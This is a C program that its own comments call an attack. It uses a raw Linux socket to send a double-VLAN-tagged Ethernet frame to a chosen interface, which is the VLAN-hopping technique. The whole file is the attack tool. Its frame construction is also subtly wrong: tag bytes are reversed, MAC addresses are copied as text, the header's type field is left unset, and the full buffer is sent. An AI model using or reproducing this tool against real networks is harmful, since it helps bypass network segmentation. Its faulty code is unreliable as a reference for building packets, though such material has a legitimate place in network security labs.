#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>

int sock;                       // Raw socket file descriptor
struct sockaddr_ll sa;          // sockaddr_ll is used for raw sockets in Linux
char buffer[2048];               // Buffer to store the Ethernet frame (can be large for complex frames)

// Function to set up the raw socket and bind it to the specified network interface
void setup_raw_socket(char *interface) {
    struct ifreq ifr;

    // Create a raw socket
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Get the index of the specified network interface
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name) - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) == -1) {
        perror("Failed to get interface index");
        exit(1);
    }

    // Set the protocol type to listen for all Ethernet frames
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = ifr.ifr_ifindex;  // Bind to the interface's index
}

// Function to construct the Ethernet frame with double VLAN tags
void build_double_tagged_frame(char *src_mac, char *dest_mac, unsigned short outer_vlan, unsigned short inner_vlan) {
    struct ether_header *eth_header = (struct ether_header *) buffer;

    // Set the destination and source MAC addresses
    memcpy(eth_header->ether_dhost, dest_mac, 6);
    memcpy(eth_header->ether_shost, src_mac, 6);

    // Construct the first VLAN tag (outer tag)
    unsigned char *vlan_tag1 = buffer + sizeof(struct ether_header);
    vlan_tag1[0] = 0x00; // Tag Protocol Identifier (0x8100)
    vlan_tag1[1] = 0x81; // Tag Protocol Identifier (0x8100)
    vlan_tag1[2] = (outer_vlan >> 8) & 0xFF; // Outer VLAN ID
    vlan_tag1[3] = outer_vlan & 0xFF;         // Outer VLAN ID

    // Construct the second VLAN tag (inner tag)
    unsigned char *vlan_tag2 = vlan_tag1 + 4; // Skip 4 bytes for the outer tag
    vlan_tag2[0] = 0x00; // Tag Protocol Identifier (0x8100)
    vlan_tag2[1] = 0x81; // Tag Protocol Identifier (0x8100)
    vlan_tag2[2] = (inner_vlan >> 8) & 0xFF; // Inner VLAN ID
    vlan_tag2[3] = inner_vlan & 0xFF;         // Inner VLAN ID

    // After the VLAN tags, fill the remaining bytes with Ethernet frame data (ethertype and payload)
    char *eth_type = buffer + sizeof(struct ether_header) + 8; // Skip the 8 bytes for the VLAN tags
    eth_type[0] = 0x08;  // Ethertype field (0x0800 for IPv4)
    eth_type[1] = 0x00;  // Ethertype field (0x0800 for IPv4)
}

// Function to send the crafted Ethernet frame through the raw socket
void send_frame() {
    // Send the packet to the network
    int bytes_sent = sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll));
    if (bytes_sent < 0) {
        perror("Failed to send packet");
        exit(1);
    } else {
        printf("Sent %d bytes\n", bytes_sent);
    }
}

// Main function to drive the attack
int main(int argc, char *argv[]) {
    if (argc != 6) {
        // Check if the user provided the correct number of arguments
        fprintf(stderr, "Usage: %s <interface> <src_mac> <dest_mac> <outer_vlan> <inner_vlan>\n", argv[0]);
        exit(1);
    }

    // Parse command line arguments
    char *interface = argv[1];
    char *src_mac = argv[2]; // Source MAC address (e.g., "00:11:22:33:44:55")
    char *dest_mac = argv[3]; // Destination MAC address (e.g., "00:66:77:88:99:AA")
    unsigned short outer_vlan = atoi(argv[4]); // Outer VLAN ID (e.g., 10)
    unsigned short inner_vlan = atoi(argv[5]); // Inner VLAN ID (e.g., 20)

    // Set up the raw socket and bind it to the specified network interface
    setup_raw_socket(interface);

    // Build the double-tagged Ethernet frame
    build_double_tagged_frame(src_mac, dest_mac, outer_vlan, inner_vlan);

    // Send the crafted frame to the network
    send_frame();

    // Close the socket after use
    close(sock);

    return 0;
}
